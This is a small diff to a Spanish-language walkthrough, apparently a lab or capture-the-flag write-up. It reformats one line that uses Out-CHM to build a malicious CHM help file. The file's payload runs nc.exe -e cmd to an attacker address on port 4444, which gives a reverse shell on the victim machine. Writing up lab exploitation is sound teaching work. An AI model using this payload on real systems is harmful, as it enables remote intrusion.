@@ -111,7 +111,7 @@ Para poder utilizar la herramienta nos la tenemos que descargar del repositorio 
 
 Una vez hecho lo anterior podemos pasar al siguiente paso, crear nuestro archivo `CHM` malicioso, para ello ejecutaremos lo siguiente:
 
-- ```Out-CHM -Payload "\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 4444" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"```
+```Out-CHM -Payload "\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 4444" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"```
 
 Como vemos estamos especificando una ruta, esa ruta será la que se utilizará en la máquina víctima y donde se alojará nuestro `NC`.
 
